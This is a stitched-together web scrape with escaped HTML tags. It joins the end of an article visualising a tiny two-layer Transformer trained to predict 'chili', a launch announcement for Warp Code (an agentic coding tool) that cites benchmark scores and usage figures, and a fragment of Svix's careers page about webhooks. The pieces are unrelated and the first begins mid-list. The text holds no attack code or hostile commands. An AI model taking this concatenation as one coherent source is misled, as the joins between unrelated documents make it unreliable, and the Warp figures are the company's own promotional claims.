      &lt;item&gt;('chili', 3),&lt;/item&gt;
      &lt;item&gt;('sour', 4),&lt;/item&gt;
      &lt;item&gt;('of', 5),&lt;/item&gt;
      &lt;item&gt;('taste', 6),&lt;/item&gt;
      &lt;item&gt;('apple', 7),&lt;/item&gt;
      &lt;item&gt;('sweet', 8),&lt;/item&gt;
      &lt;item&gt;('juicy', 9),&lt;/item&gt;
      &lt;item&gt;('a', 10),&lt;/item&gt;
      &lt;item&gt;('spicy', 11),&lt;/item&gt;
      &lt;item&gt;('so', 12),&lt;/item&gt;
      &lt;item&gt;('like', 13),&lt;/item&gt;
      &lt;item&gt;('tastes', 14),&lt;/item&gt;
      &lt;item&gt;('i', 15),&lt;/item&gt;
      &lt;item&gt;('lemon', 16),&lt;/item&gt;
      &lt;item&gt;('UNKNOWN', 17),&lt;/item&gt;
      &lt;item&gt;('PADDING', 18)]&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h3"&gt;Simplified Model Architecture&lt;/head&gt;
    &lt;p&gt;The Transformer model itself is a decoder-only model drastically scaled down compared to typical Large Language Models (LLMs). It features only 2 layers with 2 attention heads each, and employs small 20-dimensional embeddings. Furthermore, it uses tied word embeddings (the same matrix for input lookup and output prediction, also used in Google's Gemma), reducing parameters and linking input/output representations in the same vector space which is helpful for visualization. This results in a model with roughly 10,000 parameters, vastly smaller than typical LLMs (billions/trillions of parameters). This extreme simplification makes internal computations tractable and visualizable.&lt;/p&gt;
    &lt;head rend="h3"&gt;Training and Validation Result&lt;/head&gt;
    &lt;p&gt;After training for 10,000 steps, the model achieves low loss on both the training data and the validation sentence. Crucially, when prompted with the validation input "i like spicy so i like", the model correctly predicts "chili" as the next token. This success on unseen data confirms the model learned the intended chili/spicy association from the limited training examples, demonstrating generalization beyond simple memorization.&lt;/p&gt;
    &lt;head rend="h2"&gt;Visualizing the Internals&lt;/head&gt;
    &lt;p&gt;While Transformer implementations operate on multi-dimensional tensors for efficiency in order to handle batches of sequences and processing entire context windows in parallel, we can simplify our conceptual understanding. At the core, every token is represented by a one-dimensional embedding vector and the internal representation derived from the token embedding is repeatedly represented as an one-dimensional vector throughout the process. This property can be used for visualization.&lt;/p&gt;
    &lt;head rend="h3"&gt;Token Embeddings&lt;/head&gt;
    &lt;p&gt;Our model uses 20-dimensional embeddings, meaning each token is initially represented by 20 numbers. To visualize these abstract vectors, each 20-dimensional embedding is represented as a stack of five boxes. Every four numbers in the vector control the properties (height, width, depth, and color) of one box in the stack.&lt;/p&gt;
    &lt;p&gt;Examining the embeddings of taste-related tokens ("juicy", "sour", "sweet", "spicy"), one can observe the learned 20 parameters for each. The visualization clearly shows that every token develops an individual representation. At the same time, these taste tokens also share some visual properties in their embeddings, such as the lower boxes being light-colored, while the upper boxes use stronger colors. Also, the lowest box appears rather high and narrow. This suggests the model is capturing both unique aspects of each taste and common features shared by the concept of 'taste' itself.&lt;/p&gt;
    &lt;p&gt;These visualizations show the distinct starting points for each token before they interact within the Transformer layers.&lt;/p&gt;
    &lt;head rend="h3"&gt;Forward Pass&lt;/head&gt;
    &lt;p&gt;When providing the model with a list of tokens, it will output possible next tokens and their likelihoods. As described above, our model succeeds on the validation dataset, meaning it completes the sequence "i like spicy so i like" with the token "chili". Let's look at what happens inside the model when it processes this sequence in the forward pass.&lt;/p&gt;
    &lt;p&gt;In a first step, all input tokens are embedded. Examine their visualization below. It is clearly visible how same tokens are represented by same token vectors. Also, the "spicy" embedding is the same as shown above.&lt;/p&gt;
    &lt;p&gt;Following the initial embedding, the tokens proceed through the Transformer's layers sequentially. Our model utilizes two such layers. Within each layer, every token's 20-dimensional vector representation is refined based on context provided by other tokens (via the attention mechanism, discussed later).&lt;/p&gt;
    &lt;p&gt;Crucially, the final representation of the last input token (in this case, the second "like" on the right side) after passing through all layers (from front to back) is used to predict the next token in the sequence. Because the model confidently predicts "chili" should follow this sequence, the vector representation for the final "like" token evolves to closely resemble the embedding vector for "chili" (shown below) in Transformer Layer 2.&lt;/p&gt;
    &lt;p&gt;Comparing the vectors reveals a visual similarity. Both box stacks share key features: a very similar base box, a darkish narrow second box, a flat and light-colored middle box, a tall and light fourth box, and a small, light top box. This close resemblance in their visual structure clearly demonstrates how the model's internal state for the final input token has evolved through the layers to closely match the representation of the predicted next token, "chili".&lt;/p&gt;
    &lt;p&gt;Input and output token embeddings are only identical, because the model shares the learned embedding matrix of the initial layer with the final layer producing the logits. This is called tied embeddings and is typically used to reduce the number of trainable parameters.&lt;/p&gt;
    &lt;head rend="h3"&gt;Attention in Transformer Layers&lt;/head&gt;
    &lt;p&gt;Within each Transformer layer, the transformation of a token's vector representation isn't solely based on the token itself. The crucial attention mechanism allows each token to look at preceding tokens within the sequence and weigh their importance. This means that as a token's vector passes through a layer, it's updated not just by its own information but also by incorporating relevant context from other parts of the input sequence. This ability to selectively focus on and integrate information from different positions is what gives Transformers their power in understanding context and relationships within the data.&lt;/p&gt;
    &lt;p&gt;Visualizing which tokens the attention mechanism focuses on when transforming each token reveals several details about how the model processes the sequence.&lt;/p&gt;
    &lt;head rend="h2"&gt;Conclusion&lt;/head&gt;
    &lt;p&gt;By radically simplifying the dataset, tokenization, and model architecture, this article provided a step-by-step visualization of a decoder-only Transformer's internal workings. We observed how initial token embeddings capture semantic meaning and how these representations are progressively refined through the Transformer layers. The visualizations clearly demonstrated the final prediction vector evolving to match the target token's embedding. Furthermore, examining the attention mechanism revealed how the model selectively focuses on relevant prior tokens to inform its predictions, successfully generalizing even from a minimal dataset. While highly simplified, this approach offers valuable intuition into the fundamental processes of information flow and contextual understanding within Transformer models.&lt;/p&gt;

  &lt;main&gt;
    &lt;p&gt;Today, we’re launching Warp Code — a suite of features for shipping agent-generated code all the way from prompt to production.&lt;/p&gt;
    &lt;p&gt;With Warp Code you get:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Top-rated coding agent: #1 on Terminal-bench (52%) and top three on SWE-bench Verified (75.8%, scored with GPT-5). We built the UI from the ground up to be the best experience for agentic coding.&lt;/item&gt;
      &lt;item&gt;Code review: Review open changes, ask for modifications, and line-edit code diffs in a dedicated panel&lt;/item&gt;
      &lt;item&gt;Code editing: A lightweight file viewing and editing experience in Warp with tabbed file viewing, a file tree, and syntax highlighting&lt;/item&gt;
      &lt;item&gt;Projects in Warp: Initialize projects with their own WARP.md files (compatible with Agents.MD, Claude.MD and cursor rules). You can also define agent profiles to launch agents with different default settings, and global slash commands.&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h1"&gt;Why we built Warp Code&lt;/head&gt;
    &lt;p&gt;In June, we launched Warp 2.0, the Agentic Development Environment. Our thesis: development is shifting from coding by hand to coding by prompt. The workflow of opening a file and hand-writing code is becoming obsolete. Instead, developers will start with a prompt – tell an agent to fix a bug, build a feature, debug a server crash in prod… and watch it work.&lt;/p&gt;
    &lt;p&gt;The vision resonated: since the ADE launch, we’ve seen faster growth than ever before in Warp’s history. We've onboarded hundreds of thousands of users, and revenue is up 30x this year.&lt;/p&gt;
    &lt;quote&gt;&lt;p&gt;I used to be sold on Cursor—after using Warp, I understand what the development flows of the future look like. Warp is unlike any other tool I’ve used, and I’ll never go back.&lt;/p&gt;Michael Stoppelman, Former SVP of Engineering, Yelp&lt;/quote&gt;
    &lt;p&gt;However, even as agents improve, there’s still a big gap in getting from prompt all the way to prod. Even the most powerful agents like Warp still benefit from the knowledge, context, and guidance of experienced engineers.&lt;/p&gt;
    &lt;p&gt;Too often agents write code that almost works, but has subtle issues that end up taking a lot of time to understand, debug, and commit.&lt;/p&gt;
    &lt;p&gt;The solution is not to back away from developing by prompt – instead it’s to improve the prompting workflow so that developers have more comprehension and control.&lt;/p&gt;
    &lt;p&gt;We call this process “agent steering” and our goal with Warp Code is to ship the most “steer”-able coding agent around.&lt;/p&gt;
    &lt;head rend="h1"&gt;What’s in Warp Code&lt;/head&gt;
    &lt;p&gt;Because of where Warp sits in the application stack compared to tools like Claude Code and Gemini CLI, we can offer a richer UX for steering agents. Features like code review and file editing support a tight feedback loop between developer and agent: prompt, review, edit, and ship.&lt;/p&gt;
    &lt;head rend="h2"&gt;Number one coding agent&lt;/head&gt;
    &lt;p&gt;Most importantly, we continue to improve the quality of our coding agent. We are #1 on Terminal-Bench, and continue to climb the leader board on SWE-bench Verified, now clocking in at 75.8%, which is #3 overall.&lt;/p&gt;
    &lt;p&gt;Since June, Warp’s SWE-bench Verified score has increased nearly 5%. The improvement is due to two key changes. First, we used GPT-5 high-reasoning as the primary model. GPT-5 high reasoning is available to all Warp users. Second, we made a lot of improvements at the app layer to optimize agents: to do lists, file editing, long-conversation management, and more. Read more about the improvements.&lt;/p&gt;
    &lt;quote&gt;&lt;p&gt;We’re excited to see Warp and GPT-5 set a new bar hitting 75.8% on SWE-Bench Verified. This milestone shows how far agentic coding has come, and how Warp is pushing the boundaries of what developers can achieve from prompt to production.&lt;/p&gt;Marc Manara, Head of Startups, OpenAI&lt;/quote&gt;
    &lt;p&gt;Our agent always includes access to the top models even as they change, and we will continue to improve the behind-the-scenes context and prompt engineering that makes Warp’s agent the most powerful around.&lt;/p&gt;
    &lt;head rend="h2"&gt;Code review&lt;/head&gt;
    &lt;p&gt;There are lots of code review products on the market, but Warp’s is unique because it is built for humans reviewing agent-generated code. In a world where agents write more and more code, we think this is the flow that actually matters most (not agents reviewing human generated code, although that’s cool too).&lt;/p&gt;
    &lt;p&gt;So in Warp, you can now view your agent’s changes as they are written, and steer the agent as it works. Our diff view works against your current branch or main and allows you to easily reprompt by referencing specific diffs and lines. It also allows hand editing right in the diff view.&lt;/p&gt;
    &lt;p&gt;All this saves you from having to context switch to Github just to see what an agent’s done. It increases your comprehension and makes it easier to ship correct, maintainable agent-generated code.&lt;/p&gt;
    &lt;head rend="h2"&gt;Native file editor&lt;/head&gt;
    &lt;p&gt;You can now open and edit files directly in Warp — complete with features like syntax highlighting, a tabbed file viewer, and find and replace (and, of course, vim keybindings).&lt;/p&gt;
    &lt;p&gt;The primary use case here is small edits to agent-generated code – because sometimes a hand-edit is faster than re-prompting; like when you just want to change a variable name, edit a bit of copy, or rewrite a small function.&lt;/p&gt;
    &lt;p&gt;We also shipped a simple file tree for browsing, opening, and adding files as context, as well as file opening and creation using the file palette (cmd-O).&lt;/p&gt;
    &lt;p&gt;We aren’t trying to rebuild an IDE here – we think the ADE approach is where things are headed. But, we do see the value in having just enough code editing capabilities to get an agent’s changes over the line.&lt;/p&gt;
    &lt;head rend="h2"&gt;Projects: WARP.md, slash commands, and agent profiles&lt;/head&gt;
    &lt;p&gt;You’ll notice a new zero state and welcome screen in Warp that allows you to quickly start new projects, navigate to existing ones or resume prior conversations. This makes it faster to get going on something new or pick up right where you left off.&lt;/p&gt;
    &lt;p&gt;If you’re starting a new project, Warp will set up for you with project rules and codebase indexing.&lt;/p&gt;
    &lt;p&gt;If you have an existing project, you can now run /init (and a host of other slash commands) to bootstrap it with a version-controlled WARP.md file. Warp also supports AGENTS.md, CLAUDE.md and Cursor rules.&lt;/p&gt;
    &lt;p&gt;Beyond /init, slash commands also allow you to quickly add global rules, MCP servers, and execute saved prompts. All of this makes agents much more context-aware and powerful.&lt;/p&gt;
    &lt;p&gt;Finally, we introduced Agent Profiles in this release, which let you specify a model + set of permissions for an agent. Profiles allow you to run different types of agents for different tasks with confidence the agent won’t do more than it's allowed to.&lt;/p&gt;
    &lt;head rend="h2"&gt;Suggested code diffs&lt;/head&gt;
    &lt;p&gt;We included one other special feature in the code launch, which is that our coding agent can now proactively suggest fixes so you don’t even need to invoke it.&lt;/p&gt;
    &lt;p&gt;If you have a compiler error or merge conflict, the agent just tries to fix it for you on the spot – you can always dismiss, reprompt, or start a conversation from the suggestion if you need to refine it.&lt;/p&gt;
    &lt;head rend="h1"&gt;Early feedback&lt;/head&gt;
    &lt;p&gt;A subset of Warp users have been testing Warp Code for weeks. Some early results from their testing include:&lt;/p&gt;
    &lt;head rend="h2"&gt;150M lines of code per week, 97% acceptance rate&lt;/head&gt;
    &lt;p&gt;Users have been generating over 150M lines of code each week in Warp. More exciting, over 97% of code diffs generated by Warp are accepted by end users.&lt;/p&gt;
    &lt;head rend="h2"&gt;1 hour saved each day&lt;/head&gt;
    &lt;p&gt;We surveyed our Warp Code users and learned that they save, on average one hour a day. 25% of respondents said Warp saved over two hours each day.&lt;/p&gt;
    &lt;head rend="h1"&gt;What comes next&lt;/head&gt;
    &lt;p&gt;Warp Code is just the beginning. We’re building for a future where Warp is the primary tool developers need to ship software, but there’s work to be done to get us there. In the coming months, look forward to product updates including:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Further editor improvements like LSP support, symbol navigation&lt;/item&gt;
      &lt;item&gt;More intelligent and streamlined code review&lt;/item&gt;
      &lt;item&gt;Remote environment support&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;To those who have been using Warp already, thank you for your role in our journey. For those joining with this launch, welcome to the community.&lt;/p&gt;
    &lt;p&gt;Give Warp Code a try, and let us know what you think.&lt;/p&gt;

You will get a first-hand experience of every aspect of running a venture-backed business and building developer tools from the ground up. We are not looking for employees, we are looking for teammates.&lt;/p&gt;
    &lt;p&gt;Webhooks will become a key part of every API. Many companies already offer webhooks, and this will only keep on growing. We will lead the way on how webhooks should be implemented, and aim to power most of the web's webhooks. The same way SendGrid powers a big percentage of transactional emails, and Twilio does for SMS. We will use this position to become a key player in the API-first future of software.&lt;/p&gt;
    &lt;p&gt;See what Andreessen Horowitz (a16z) had to say about why they invested in Svix.&lt;/p&gt;
    &lt;p&gt;We are always looking for great people. If you think you would be a good addition to the team, but don't match any of the open positions, please feel free to apply regardless.&lt;/p&gt;
    &lt;p&gt;We are here for you.&lt;/p&gt;
